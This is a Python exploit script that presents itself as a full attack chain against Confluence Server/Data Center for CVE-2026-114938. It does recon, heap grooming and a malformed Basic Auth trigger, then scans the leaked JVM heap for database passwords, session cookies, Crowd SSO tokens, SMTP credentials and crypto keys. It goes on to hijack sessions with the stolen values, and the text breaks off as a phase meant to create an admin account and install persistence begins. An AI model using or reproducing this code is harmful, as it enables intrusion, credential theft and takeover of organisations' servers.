#!/usr/bin/env python3
"""
Java4Shell Confluence Exploit Chain — CVE-2026-114938
Confluence Server/Data Center specific profile.

Chain:
  Phase 1  RECON      — Fingerprint Confluence version, auth mode
  Phase 2  WARM       — JIT compile AVX-512 intrinsic via Basic Auth
  Phase 3  REHEARSE   — RTT calibration for release timing
  Phase 4  GROOM      — Tomcat-specific Heap Feng Shui
  Phase 5  TRIGGER    — Malformed Base64 → overflow
  Phase 6  JAVABLEED  — Parse leaked heap for Confluence secrets
  Phase 7  TAKEOVER   — Use stolen secrets for admin access
  Phase 8  ADMIN      — Create admin account, install persistence

Requires: x86-64 host with AVX-512 VBMI, Confluence on vulnerable JDK
Note: Confluence Cloud is NOT affected (different infrastructure)

Usage:
  python3 confluence_chain.py --url http://localhost:8090
  python3 confluence_chain.py --url https://confluence.corp:443 --attempts 50
"""

import argparse
import base64
import hashlib
import hmac
import json
import math
import os
import re
import socket
import ssl as ssl_mod
import struct
import sys
import time
import urllib.parse
import urllib.request
import urllib.error

# ═══════════════════════════════════════════════════════════════
# Constants
# ═══════════════════════════════════════════════════════════════

TRIGGER_B64 = "A" * 64 + "="
TRIGGER_B64_JDK17 = "A" * 128 + "="
WARMUP_DEFAULT = 5000

# Confluence Server/DC runs on embedded Tomcat.
# Basic Auth decoded by org.apache.catalina.authenticator.BasicAuthenticator
# → java.util.Base64.getDecoder().decode() — the vulnerable intrinsic.
#
# Tomcat thread model: org.apache.tomcat.util.threads.ThreadPoolExecutor
# Default max 200 threads, each request thread has its own TLAB.
# Sequential allocations within a single request land adjacent on the TLAB.
#
# Confluence REST endpoints allocate more objects per request than
# simpler apps due to content rendering and Lucene indexing overhead.

# Confluence endpoints
CF_STATUS = "/status"
CF_MANIFEST = "/rest/applinks/1.0/manifest"
CF_CURRENT_USER = "/rest/api/user/current"
CF_CONTENT = "/rest/api/content"
CF_SPACE = "/rest/api/space"
CF_SYSTEM_INFO = "/rest/api/settings/systemInfo"
CF_ACCESS_MODE = "/rest/api/accessmode"
CF_LOGIN = "/login.action"
CF_ADMIN_USER = "/rest/api/admin/user"
CF_ADMIN_GROUP_MEMBER = "/rest/api/admin/group/{group}/member"

# Secrets in JVM heap:
#   1. Database credentials — JDBC pool, passwords decrypted in memory
#   2. JSESSIONID session cookies — Tomcat sessions
#   3. Crowd SSO tokens — crowd.token_key (very common in Atlassian deployments)
#   4. SMTP credentials — mail server passwords
#   5. License keys — Atlassian license strings
#   6. javax.crypto.spec.SecretKeySpec — AES keys for encrypted config
#   7. OAuth/Application Link secrets — linked Jira/Bitbucket shared secrets
#   8. Synchrony tokens — collaborative editing (Confluence 6.x+)

# Grooming parameters — tuned for Tomcat allocation patterns
# Tomcat allocates per request:
#   1. org.apache.coyote.Request (~200+ bytes)
#   2. byte[] for each header value
#   3. org.apache.tomcat.util.buf.MessageBytes for parsed headers
#   4. Base64 decode buffer (50 bytes → 72 byte object)
#   5. Response output buffer
GROOM_SPRAY_SIZE = 40
GROOM_PADDING_SIZES = [
    48,   # object = align8(16+48) = 64
    64,   # object = align8(16+64) = 80
    96,   # object = align8(16+96) = 112
    48,   # repeat the sweet spot
    80,   # object = align8(16+80) = 96
]

NC = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"
RED = "\033[0;31m"
GREEN = "\033[0;32m"
YELLOW = "\033[1;33m"
CYAN = "\033[0;36m"
WHITE = "\033[1;37m"
MAGENTA = "\033[0;35m"


# ═══════════════════════════════════════════════════════════════
# Timer
# ═══════════════════════════════════════════════════════════════


class Timer:
    def __init__(self):
        self.start = time.time()
        self.run_start = time.time()
        self.try_count = 0

    def elapsed(self):
        return time.time() - self.start

    def run_elapsed(self):
        return time.time() - self.run_start

    def reset_run(self):
        self.run_start = time.time()
        self.try_count += 1

    @staticmethod
    def fmt(seconds):
        h = int(seconds // 3600)
        m = int((seconds % 3600) // 60)
        s = seconds % 60
        return f"{h:02d}:{m:02d}:{s:04.1f}"

    def log(self, marker, msg):
        ts = self.fmt(self.elapsed())
        colors = {"+": GREEN, "~": YELLOW, "!": RED, "*": CYAN}
        c = colors.get(marker, DIM)
        print(f"  {DIM}{ts}{NC}  [{c}{marker}{NC}] {msg}")


# ═══════════════════════════════════════════════════════════════
# HTTP helpers
# ═══════════════════════════════════════════════════════════════


def http_get(url, headers=None, timeout=10):
    if headers is None:
        headers = {}
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return str(e), None, None


def http_post(url, body, headers=None, timeout=10):
    if headers is None:
        headers = {}
    if isinstance(body, str):
        body = body.encode()
    try:
        req = urllib.request.Request(url, data=body, headers=headers,
                                    method="POST")
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return str(e), None, None


def http_put(url, body, headers=None, timeout=10):
    if headers is None:
        headers = {}
    if isinstance(body, str):
        body = body.encode()
    try:
        req = urllib.request.Request(url, data=body, headers=headers,
                                    method="PUT")
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return str(e), None, None


class RawHTTP:
    def __init__(self, host, port, use_ssl=False):
        self.sock = socket.create_connection((host, port), timeout=10)
        if use_ssl:
            ctx = ssl_mod.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl_mod.CERT_NONE
            self.sock = ctx.wrap_socket(self.sock, server_hostname=host)

    def send(self, data):
        if isinstance(data, str):
            data = data.encode()
        self.sock.sendall(data)

    def recv(self, timeout=5.0):
        self.sock.settimeout(timeout)
        chunks = []
        try:
            while True:
                chunk = self.sock.recv(65536)
                if not chunk:
                    break
                chunks.append(chunk)
        except socket.timeout:
            pass
        except OSError:
            pass
        return b"".join(chunks)

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass


def parse_url(url):
    p = urllib.parse.urlparse(url)
    host = p.hostname
    use_ssl = p.scheme == "https"
    port = p.port or (443 if use_ssl else 80)
    return host, port, use_ssl


def parse_raw_response(raw):
    if not raw:
        return 0, {}, b""
    try:
        hdr_end = raw.index(b"\r\n\r\n")
        hdr_block = raw[:hdr_end].decode(errors="replace")
        body = raw[hdr_end + 4:]
        lines = hdr_block.split("\r\n")
        status = int(lines[0].split(" ", 2)[1])
        headers = {}
        for line in lines[1:]:
            if ": " in line:
                k, v = line.split(": ", 1)
                headers[k.lower()] = v
        return status, headers, body
    except (ValueError, IndexError):
        return 0, {}, raw


# ═══════════════════════════════════════════════════════════════
# Phase 1: RECON
#
# Confluence exposes version info through several endpoints:
#   - /status — JSON with state, may include build
#   - /rest/applinks/1.0/manifest — XML with version info
#   - Login page HTML — version in meta tags or footer
#   - X-ASEN header — Atlassian session
#   - X-Confluence-Request-Time header
# ═══════════════════════════════════════════════════════════════


def phase_recon(timer, base_url):
    timer.log("*", "RECON — Confluence fingerprint")

    info = {
        "version": None,
        "build": None,
        "auth_required": False,
        "deployment": "server",
        "jdk_hint": None,
    }

    # Probe /status (usually accessible without auth)
    status, headers, body = http_get(base_url + CF_STATUS)

    if not isinstance(status, int):
        timer.log("!", f"Confluence not reachable: {status}")
        return None

    timer.log("+", f"GET /status  HTTP {status}")

    if headers:
        server = headers.get("Server", headers.get("server", ""))
        if server:
            timer.log("+", f"Server: {server}")

        for key in ("X-ASEN", "x-asen"):
            if key in headers:
                timer.log("+", f"Atlassian session header present")
                break

        for key in ("X-Confluence-Request-Time",
                     "x-confluence-request-time"):
            if key in headers:
                timer.log("+", f"Confluence request time header present")
                break

    if isinstance(status, int) and status == 200 and body:
        try:
            status_data = json.loads(body)
            state = status_data.get("state", "")
            timer.log("+", f"Server state: {state}")
        except (json.JSONDecodeError, TypeError):
            pass

    # Try /rest/applinks/1.0/manifest for version
    ms, mh, mbody = http_get(base_url + CF_MANIFEST)
    if isinstance(ms, int) and ms == 200 and mbody:
        text = mbody.decode(errors="replace")
        # XML contains <version>X.Y.Z</version>
        m = re.search(r"<version>([^<]+)</version>", text)
        if m:
            info["version"] = m.group(1)
            timer.log("+", f"Confluence version: {m.group(1)}")
        m = re.search(r"<buildNumber>(\d+)</buildNumber>", text)
        if m:
            info["build"] = m.group(1)
            timer.log("+", f"Build number: {m.group(1)}")

    # Fallback: parse login page for version
    if not info["version"]:
        ls, lh, lbody = http_get(base_url + CF_LOGIN)
        if isinstance(ls, int) and lbody:
            text = lbody.decode(errors="replace")
            m = re.search(
                r'<meta\s+name="ajs-version-number"\s+'
                r'content="([^"]+)"', text)
            if m:
                info["version"] = m.group(1)
                timer.log("+", f"Confluence version (meta): {m.group(1)}")
            m = re.search(
                r'<meta\s+name="ajs-build-number"\s+'
                r'content="([^"]+)"', text)
            if m:
                info["build"] = m.group(1)

    # Check if anonymous access is allowed
    anon_status, _, anon_body = http_get(base_url + CF_CONTENT + "?limit=1")
    if isinstance(anon_status, int):
        if anon_status == 200:
            info["auth_required"] = False
            timer.log("+", "Anonymous access: ALLOWED")
        elif anon_status in (401, 403):
            info["auth_required"] = True
            timer.log("+", "Anonymous access: DENIED (auth required)")
        else:
            timer.log("~", f"Anonymous probe: HTTP {anon_status}")

    return info


# ═══════════════════════════════════════════════════════════════
# Phase 2: WARM
#
# Confluence processes Basic Auth on every REST API request via
# Tomcat's BasicAuthenticator before the request reaches
# Confluence code. We use GET /rest/api/user/current with valid
# creds — lightweight endpoint, minimal response overhead.
# ═══════════════════════════════════════════════════════════════


def phase_warm(timer, base_url, creds_b64, count):
    timer.log("*", f"WARM — {count} Basic Auth requests for JIT compilation")

    url = base_url + CF_CURRENT_USER
    headers = {"Authorization": f"Basic {creds_b64}"}

    rtts = []
    success = 0
    batch = max(count // 6, 100)

    for i in range(count):
        start = time.time()
        s, _, _ = http_get(url, headers=headers, timeout=5)
        elapsed = (time.time() - start) * 1000

        if isinstance(s, int) and s < 500:
            success += 1
            rtts.append(elapsed)

        if (i + 1) % batch == 0 or i == count - 1:
            recent = rtts[-batch:] if rtts else []
            avg = sum(recent) / len(recent) if recent else 0
            timer.log("+", f"HTTP/1 timing / {avg:.2f} ms RTT  "
                           f"({i + 1}/{count})")

    if success == 0:
        timer.log("!", "No successful warmup requests — check creds")
    else:
        timer.log("+", f"Warmup complete: {success}/{count} OK")
    return success, rtts


# ═══════════════════════════════════════════════════════════════
# Phase 3: REHEARSE
# ═══════════════════════════════════════════════════════════════


def phase_rehearse(timer, base_url, creds_b64, rounds=4):
    timer.log("*", "REHEARSE — RTT calibration")

    url = base_url + CF_CURRENT_USER
    headers = {"Authorization": f"Basic {creds_b64}"}

    rtts = []
    for r in range(rounds):
        burst = []
        for _ in range(50):
            start = time.time()
            s, _, _ = http_get(url, headers=headers, timeout=5)
            elapsed = (time.time() - start) * 1000
            if isinstance(s, int):
                burst.append(elapsed)

        if burst:
            avg = sum(burst) / len(burst)
            jitter = max(burst) - min(burst)
            p95 = sorted(burst)[int(len(burst) * 0.95)]
            rtts.append(avg)
            timer.log("+", f"Rehearsal {r + 1}/{rounds} / "
                           f"{avg:.2f} ms RTT / p95 {p95:.2f} ms / "
                           f"jitter {jitter:.2f} ms")

    return rtts


# ═══════════════════════════════════════════════════════════════
# Phase 4+5: GROOM + TRIGGER — Tomcat Heap Feng Shui
#
# Same Tomcat thread pool model as Jira. Each request runs on
# one thread from the ThreadPoolExecutor, allocating objects
# sequentially on its TLAB.
#
# Strategy: park POST requests with partial body sends, then
# release in controlled order so allocations land adjacent.
# The trigger (malformed Base64) goes last → its decode buffer
# should sit next to a victim array from a preceding request.
#
# Confluence allocates more per request than Jira due to content
# rendering / Velocity / Lucene, so we use the /rest/api/content
# endpoint for padding requests (more heap activity).
# ═══════════════════════════════════════════════════════════════


def phase_groom_trigger(timer, base_url, creds_b64,
                        spray_size, max_attempts, avg_rtt_ms,
                        trigger_b64=TRIGGER_B64):
    timer.log("*", f"GROOM+TRIGGER — spray={spray_size}, "
                   f"max_attempts={max_attempts}")

    host, port, use_ssl = parse_url(base_url)
    release_delay = max(avg_rtt_ms / 1000 * 1.5, 0.002)

    baseline_sizes = []
    all_leaked = []

    for attempt in range(1, max_attempts + 1):
        timer.reset_run()
        timer.log("*", f"Grooming attempt {attempt}/{max_attempts}")

        conns = []
        try:
            # ── PARK: open connections with partial sends ──
            for i in range(spray_size):
                conn = RawHTTP(host, port, use_ssl)

                is_trigger = (i == spray_size - 1)
                pad_size = GROOM_PADDING_SIZES[i % len(GROOM_PADDING_SIZES)]

                if is_trigger:
                    auth = f"Basic {trigger_b64}"
                else:
                    auth = f"Basic {creds_b64}"

                # POST to /rest/api/content with partial body
                body_data = (
                    '{"type":"page","title":"x","space":{"key":"X"},'
                    '"body":{"storage":{"value":"'
                    + "P" * pad_size
                    + '","representation":"storage"}}}'
                )

                request = (
                    f"POST /rest/api/content HTTP/1.1\r\n"
                    f"Host: {host}:{port}\r\n"
                    f"Authorization: {auth}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(body_data)}\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                )

                split = max(len(body_data) // 2, 1)
                conn.send(request + body_data[:split])
                conns.append((conn, body_data[split:], is_trigger))

                time.sleep(0.001)

            # ── RELEASE: send remaining body ──
            for conn, remaining, is_trigger in conns:
                if remaining:
                    conn.send(remaining)
                time.sleep(release_delay)

            # ── COLLECT responses ──
            round_baselines = []
            trigger_response = None
            trigger_body = b""

            for conn, _, is_trigger in conns:
                raw = conn.recv(timeout=5)
                code, hdrs, body = parse_raw_response(raw)

                if is_trigger:
                    trigger_response = code
                    trigger_body = body
                else:
                    if body:
                        round_baselines.append(len(body))

                conn.close()

            conns = []

            if round_baselines:
                baseline_sizes.extend(round_baselines)

            avg_baseline = (sum(baseline_sizes) / len(baseline_sizes)
                            if baseline_sizes else 0)

            if trigger_body is None:
                trigger_body = b""

            # ── ANALYSE trigger response ──
            tlen = len(trigger_body)
            non_ascii = sum(1 for b in trigger_body
                            if b > 127 or
                            (b < 32 and b not in (10, 13, 9)))
            ratio = tlen / avg_baseline if avg_baseline > 0 else 1.0

            if trigger_response == 0 or trigger_response is None:
                timer.log("!", "Connection lost (possible JVM crash)")
                timer.log("~", "Retrying after crash recovery...")
                time.sleep(3)
                continue

            if non_ascii > 20 or ratio > 2.0 or tlen > 10000:
                timer.log("+", f"{MAGENTA}HEAP DISCLOSURE{NC} — "
                               f"{tlen} bytes, {non_ascii} non-ASCII, "
                               f"ratio {ratio:.1f}x")
                timer.log("+", f"Leaked {tlen / 1048576:.1f} MiB")
                all_leaked.append(trigger_body)

                if len(all_leaked) >= 3:
                    break
            else:
                if attempt <= 5 or attempt % 5 == 0:
                    timer.log("+", f"HTTP {trigger_response}, "
                                   f"{tlen} bytes, "
                                   f"ratio {ratio:.1f}x (miss)")

        except (ConnectionRefusedError, ConnectionResetError) as e:
            timer.log("~", f"Connection error: {e}")
            time.sleep(2)
        except OSError as e:
            timer.log("~", f"Socket error: {e}")
            time.sleep(1)
        finally:
            for conn, _, _ in conns:
                conn.close()

        time.sleep(0.3)

    return all_leaked


# ═══════════════════════════════════════════════════════════════
# Phase 6: JAVABLEED — Parse leaked heap for Confluence secrets
#
# Confluence keeps several categories of secrets on the JVM heap:
#
# 1. Database credentials
#    JDBC connection pool — com.mchange.v2.c3p0 or HikariCP
#    Connection URLs contain host, port, DB name
#    Passwords stored in pool config objects, decrypted
#
# 2. Session cookies (JSESSIONID)
#    Tomcat sessions — hijack admin sessions directly
#
# 3. Crowd SSO tokens
#    crowd.token_key cookie — SSO across Atlassian products
#    Very valuable: one token → access to Jira + Confluence +
#    Bitbucket if they share a Crowd directory
#
# 4. SMTP credentials
#    Mail server passwords in memory from confluence config
#
# 5. License keys
#    Atlassian license strings — base64-encoded XML
#
# 6. SecretKeySpec objects
#    AES keys for encrypted config values
#
# 7. OAuth / Application Link secrets
#    Shared secrets for linked Jira/Bitbucket instances
#
# 8. Synchrony tokens
#    JWT-like tokens for real-time collaborative editing
#    service (Confluence 6.x+)
# ═══════════════════════════════════════════════════════════════


def find_confluence_secrets(timer, leaked_data_list):
    """Search leaked heap data for Confluence secrets."""
    timer.log("*", "JAVABLEED — Scanning heap for Confluence secrets")

    combined = b"".join(leaked_data_list)
    total_mb = len(combined) / 1048576
    timer.log("+", f"Total leaked data: {total_mb:.1f} MiB")

    secrets = {
        "db_credentials": [],
        "session_cookies": [],
        "crowd_tokens": [],
        "smtp_credentials": [],
        "license_keys": [],
        "aes_keys": [],
        "hmac_keys": [],
        "oauth_secrets": [],
        "synchrony_tokens": [],
    }

    # ── Strategy 1: Database credentials ──
    # Look for JDBC connection strings
    jdbc_markers = [
        b"jdbc:postgresql://",
        b"jdbc:mysql://",
        b"jdbc:oracle:",
        b"jdbc:sqlserver://",
        b"jdbc:h2:",
    ]
    for marker in jdbc_markers:
        offset = 0
        while True:
            idx = combined.find(marker, offset)
            if idx < 0:
                break

            # Extract the full JDBC URL (until null, newline, or
            # non-printable)
            end = idx
            while (end < len(combined) and
                   end - idx < 512 and
                   32 <= combined[end] < 127):
                end += 1

            jdbc_url = combined[idx:end].decode(errors="replace")
            secrets["db_credentials"].append({
                "type": "jdbc_url",
                "value": jdbc_url,
                "offset": idx,
            })
            timer.log("+", f"JDBC URL at offset {idx}: "
                           f"{jdbc_url[:80]}...")

            offset = idx + len(marker)

    # Look for password strings near DB-related markers
    db_pass_markers = [
        b"hibernate.connection.password",
        b"javax.persistence.jdbc.password",
        b"password",
        b"dbpassword",
    ]
    for marker in db_pass_markers:
        idx = combined.find(marker)
        if idx >= 0:
            # Look for nearby printable strings that could be passwords
            region = combined[idx:min(idx + 256, len(combined))]
            # Find value after = or : or " delimiter
            for delim in (b"=", b":", b'"'):
                d_pos = region.find(delim, len(marker))
                if d_pos >= 0:
                    val_start = d_pos + 1
                    val_end = val_start
                    while (val_end < len(region) and
                           val_end - val_start < 128 and
                           32 <= region[val_end] < 127 and
                           region[val_end] not in (34, 39, 10, 13)):
                        val_end += 1
                    if val_end > val_start + 2:
                        val = region[val_start:val_end].decode(
                            errors="replace").strip()
                        if val and val not in ("null", "true", "false"):
                            secrets["db_credentials"].append({
                                "type": "db_password",
                                "marker": marker.decode(errors="replace"),
                                "value": val,
                                "offset": idx + d_pos,
                            })
                            timer.log("+", f"DB password candidate near "
                                           f"'{marker.decode(errors='replace')}'"
                                           f" at offset {idx}")
                    break

    # ── Strategy 2: Session cookies (JSESSIONID) ──
    session_markers = [b"JSESSIONID=", b"JSESSIONID"]
    for marker in session_markers:
        offset = 0
        while True:
            idx = combined.find(marker, offset)
            if idx < 0:
                break

            val_start = idx + len(marker)
            if (val_start < len(combined) and
                    combined[val_start:val_start + 1] == b"="):
                val_start += 1

            val_end = val_start
            while (val_end < len(combined) and
                   val_end - val_start < 128 and
                   combined[val_end] not in
                   (0, 10, 13, 32, 59)):
                val_end += 1

            if val_end > val_start + 8:
                session_val = combined[val_start:val_end].decode(
                    errors="replace")
                secrets["session_cookies"].append({
                    "value": session_val,
                    "offset": idx,
                })
                timer.log("+", f"Session cookie at offset {idx}: "
                               f"{session_val[:32]}...")

            offset = idx + len(marker)

    # ── Strategy 3: Crowd SSO tokens ──
    crowd_markers = [
        b"crowd.token_key",
        b"crowd.token_key=",
        b"CrowdToken",
    ]
    for marker in crowd_markers:
        offset = 0
        while True:
            idx = combined.find(marker, offset)
            if idx < 0:
                break

            val_start = idx + len(marker)
            if (val_start < len(combined) and
                    combined[val_start:val_start + 1] in (b"=", b":")):
                val_start += 1

            val_end = val_start
            while (val_end < len(combined) and
                   val_end - val_start < 128 and
                   combined[val_end] not in (0, 10, 13, 32, 59)):
                val_end += 1

            if val_end > val_start + 8:
                token_val = combined[val_start:val_end].decode(
                    errors="replace")
                secrets["crowd_tokens"].append({
                    "value": token_val,
                    "offset": idx,
                })
                timer.log("+", f"Crowd SSO token at offset {idx}: "
                               f"{token_val[:32]}...")

            offset = idx + len(marker)

    # ── Strategy 4: SMTP credentials ──
    smtp_markers = [
        b"mail.smtp.password",
        b"smtp.password",
        b"smtpPassword",
        b"mail.smtp.auth",
    ]
    for marker in smtp_markers:
        idx = combined.find(marker)
        if idx >= 0:
            region = combined[idx:min(idx + 256, len(combined))]
            for delim in (b"=", b":", b'"'):
                d_pos = region.find(delim, len(marker))
                if d_pos >= 0:
                    val_start = d_pos + 1
                    val_end = val_start
                    while (val_end < len(region) and
                           val_end - val_start < 128 and
                           32 <= region[val_end] < 127 and
                           region[val_end] not in (34, 39, 10, 13)):
                        val_end += 1
                    if val_end > val_start + 2:
                        val = region[val_start:val_end].decode(
                            errors="replace").strip()
                        if val and val not in ("null", "true", "false"):
                            secrets["smtp_credentials"].append({
                                "marker": marker.decode(errors="replace"),
                                "value": val,
                                "offset": idx + d_pos,
                            })
                            timer.log("+", f"SMTP credential near "
                                           f"'{marker.decode(errors='replace')}'"
                                           f" at offset {idx}")
                    break

    # ── Strategy 5: License keys ──
    license_markers = [
        b"AAABk",    # Atlassian license prefix (base64)
        b"Description=",
        b"LicenseID=",
        b"atlassian.license",
    ]
    for marker in license_markers:
        idx = combined.find(marker)
        if idx >= 0:
            end = min(idx + 2048, len(combined))
            region = combined[idx:end]
            # Licenses are long base64 strings
            m = re.search(rb'[A-Za-z0-9+/=]{100,}', region)
            if m:
                secrets["license_keys"].append({
                    "value": m.group().decode(errors="replace")[:200],
                    "offset": idx + m.start(),
                })
                timer.log("+", f"License key fragment at offset {idx}")

    # ── Strategy 6: AES SecretKeySpec objects ──
    aes_markers = [(b"AES", 32), (b"AES", 16)]
    for marker, key_len in aes_markers:
        offset = 0
        while True:
            idx = combined.find(marker, offset)
            if idx < 0:
                break

            search_start = max(0, idx - 128)
            search_end = min(len(combined), idx + 128 + key_len)
            region = combined[search_start:search_end]

            for pos in range(len(region) - key_len):
                candidate = region[pos:pos + key_len]
                entropy = _byte_entropy(candidate)
                if entropy > 4.0 and len(set(candidate)) > key_len // 2:
                    abs_pos = search_start + pos
                    secrets["aes_keys"].append({
                        "key_bytes": candidate,
                        "key_hex": candidate.hex(),
                        "offset": abs_pos,
                        "entropy": round(entropy, 2),
                        "key_len": key_len,
                    })
                    timer.log("+", f"AES key candidate at offset "
                                   f"{abs_pos}: entropy={entropy:.2f}, "
                                   f"len={key_len}")

            offset = idx + len(marker)

    # ── Strategy 7: OAuth / Application Link secrets ──
    oauth_markers = [
        b"consumerKey",
        b"consumer_key",
        b"consumer_secret",
        b"shared_secret",
        b"com.atlassian.applinks",
        b"OAuthConsumer",
    ]
    for marker in oauth_markers:
        idx = combined.find(marker)
        if idx >= 0:
            timer.log("+", f"OAuth/AppLink reference: "
                           f"'{marker.decode(errors='replace')}' "
                           f"at offset {idx}")
            region = combined[idx:min(idx + 256, len(combined))]
            secrets["oauth_secrets"].append({
                "marker": marker.decode(errors="replace"),
                "offset": idx,
                "context": region[:128].hex(),
            })

    # ── Strategy 8: Synchrony tokens ──
    # Synchrony uses JWT tokens for the collaborative editing service
    sync_markers = [
        b"synchrony",
        b"synchrony-proxy",
        b"eyJ",  # JWT header prefix (base64)
    ]
    for marker in sync_markers:
        if marker == b"eyJ":
            # Only look for JWT-like tokens (3 dot-separated base64)
            offset = 0
            while True:
                idx = combined.find(marker, offset)
                if idx < 0:
                    break
                end = idx
                while (end < len(combined) and
                       end - idx < 2048 and
                       (combined[end] in
                        b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnop"
                        b"qrstuvwxyz0123456789-_.+")):
                    end += 1
                token = combined[idx:end].decode(errors="replace")
                if token.count(".") == 2 and len(token) > 50:
                    secrets["synchrony_tokens"].append({
                        "value": token[:200],
                        "offset": idx,
                    })
                    timer.log("+", f"JWT/Synchrony token at offset "
                                   f"{idx}")
                offset = idx + 4
                if len(secrets["synchrony_tokens"]) >= 10:
                    break
        else:
            idx = combined.find(marker)
            if idx >= 0:
                timer.log("+", f"Synchrony reference at offset {idx}")

    # ── Strategy 9: HMAC keys (fallback) ──
    hmac_markers = [
        (b"HmacSHA256", 32),
        (b"HmacSHA512", 64),
        (b"HmacSHA1", 20),
    ]
    for marker, key_len in hmac_markers:
        offset = 0
        while True:
            idx = combined.find(marker, offset)
            if idx < 0:
                break
            timer.log("+", f"Found '{marker.decode()}' at offset {idx}")
            search_start = max(0, idx - 256)
            search_end = min(len(combined), idx + 256 + key_len)
            region = combined[search_start:search_end]
            for pos in range(len(region) - key_len):
                candidate = region[pos:pos + key_len]
                entropy = _byte_entropy(candidate)
                if entropy > 4.0 and len(set(candidate)) > key_len // 2:
                    abs_pos = search_start + pos
                    secrets["hmac_keys"].append({
                        "key_bytes": candidate,
                        "key_hex": candidate.hex(),
                        "offset": abs_pos,
                        "entropy": round(entropy, 2),
                        "key_len": key_len,
                        "algorithm": marker.decode(),
                    })
            offset = idx + len(marker)

    # ── Strategy 10: Brute-force high-entropy scan (fallback) ──
    total_found = sum(len(v) for v in secrets.values())
    if total_found == 0:
        timer.log("~", "No markers found, scanning for "
                       "high-entropy blocks...")
        for key_len in (32, 16, 64):
            count = 0
            for pos in range(0, len(combined) - key_len, 8):
                candidate = combined[pos:pos + key_len]
                entropy = _byte_entropy(candidate)
                if (entropy > 5.5 and
                        len(set(candidate)) > key_len * 3 // 4):
                    secrets["aes_keys"].append({
                        "key_bytes": candidate,
                        "key_hex": candidate.hex(),
                        "offset": pos,
                        "entropy": round(entropy, 2),
                        "key_len": key_len,
                    })
                    count += 1
                    if count >= 20:
                        break

    # Deduplicate
    for category in secrets:
        if secrets[category]:
            seen = set()
            unique = []
            for item in secrets[category]:
                key = (item.get("key_hex", "") or
                       item.get("value", "") or
                       str(item.get("offset", "")))
                if key not in seen:
                    seen.add(key)
                    unique.append(item)
            secrets[category] = unique

    total_found = sum(len(v) for v in secrets.values())
    timer.log("+", f"Total secrets found: {total_found}")
    for cat, items in secrets.items():
        if items:
            timer.log("+", f"  {cat}: {len(items)}")

    return secrets


def _byte_entropy(data):
    """Shannon entropy in bits per byte."""
    if not data:
        return 0
    freq = {}
    for b in data:
        freq[b] = freq.get(b, 0) + 1
    entropy = 0
    n = len(data)
    for count in freq.values():
        p = count / n
        if p > 0:
            entropy -= p * math.log2(p)
    return entropy


# ═══════════════════════════════════════════════════════════════
# Phase 7: TAKEOVER — Use stolen secrets for access
#
# Priority order:
#   1. Session cookie hijack (fastest — JSESSIONID)
#   2. Crowd SSO token reuse (access all linked Atlassian apps)
#   3. Database credentials (direct DB access → modify user table)
#   4. Synchrony JWT → may grant API access
# ═══════════════════════════════════════════════════════════════


def phase_takeover(timer, base_url, secrets):
    """Try each category of stolen secrets to gain admin access."""
    timer.log("*", "TAKEOVER — Attempting admin access")

    # ── Try 1: Session cookie hijack ──
    for session in secrets.get("session_cookies", []):
        cookie_val = session["value"]
        timer.log("+", f"Trying session cookie: {cookie_val[:24]}...")

        status, _, body = http_get(
            base_url + CF_CURRENT_USER,
            headers={"Cookie": f"JSESSIONID={cookie_val}"},
            timeout=5)

        if isinstance(status, int) and status == 200 and body:
            try:
                user_data = json.loads(body)
                username = user_data.get("username",
                                         user_data.get("displayName",
                                                       "unknown"))
                timer.log("+", f"{GREEN}SESSION HIJACKED{NC} — "
                               f"logged in as '{username}'")

                # Check if user is admin by probing admin endpoint
                admin_check, _, _ = http_get(
                    base_url + CF_SYSTEM_INFO,
                    headers={"Cookie": f"JSESSIONID={cookie_val}"},
                    timeout=5)
                is_admin = (isinstance(admin_check, int) and
                            admin_check == 200)

                return {
                    "method": "session_hijack",
                    "user": username,
                    "is_admin": is_admin,
                    "cookie": cookie_val,
                    "auth_header": None,
                }
            except (json.JSONDecodeError, TypeError):
                pass

    # ── Try 2: Crowd SSO token ──
    for token_info in secrets.get("crowd_tokens", []):
        token_val = token_info["value"]
        timer.log("+", f"Trying Crowd SSO token: {token_val[:24]}...")

        status, _, body = http_get(
            base_url + CF_CURRENT_USER,
            headers={"Cookie": f"crowd.token_key={token_val}"},
            timeout=5)

        if isinstance(status, int) and status == 200 and body:
            try:
                user_data = json.loads(body)
                username = user_data.get("username", "unknown")
                timer.log("+", f"{GREEN}CROWD SSO HIJACKED{NC} — "
                               f"user '{username}'")
                return {
                    "method": "crowd_sso",
                    "user": username,
                    "is_admin": False,
                    "cookie": f"crowd.token_key={token_val}",
                    "auth_header": None,
                }
            except (json.JSONDecodeError, TypeError):
                pass

    # ── Try 3: DB credentials ──
    for db_info in secrets.get("db_credentials", []):
        if db_info["type"] == "jdbc_url":
            timer.log("~", f"DB URL found: {db_info['value'][:60]}...")
            timer.log("~", "  → Direct DB access possible for "
                           "credential manipulation")
        elif db_info["type"] == "db_password":
            timer.log("~", f"DB password candidate: "
                           f"{db_info['value'][:20]}...")

    # ── Try 4: Synchrony JWT tokens ──
    for token_info in secrets.get("synchrony_tokens", []):
        timer.log("~", f"Synchrony token: "
                       f"{token_info['value'][:48]}...")

    timer.log("~", "No direct access method succeeded")
    timer.log("~", "Leaked secrets logged for manual exploitation")
    return None


# ═══════════════════════════════════════════════════════════════
# Phase 8: ADMIN — Create admin user and establish persistence
#
# With admin access, Confluence allows:
#   1. Create user via REST API
#   2. Add user to confluence-administrators group
#   3. Install user macros with Groovy (if enabled)
#   4. Install plugins (OSGi bundles) for persistent RCE
#   5. Export spaces (data exfiltration)
# ═══════════════════════════════════════════════════════════════


def phase_admin(timer, base_url, access_info, new_username):
    """Create admin user via Confluence REST API."""
    timer.log("*", f"ADMIN — Creating admin user '{new_username}'")

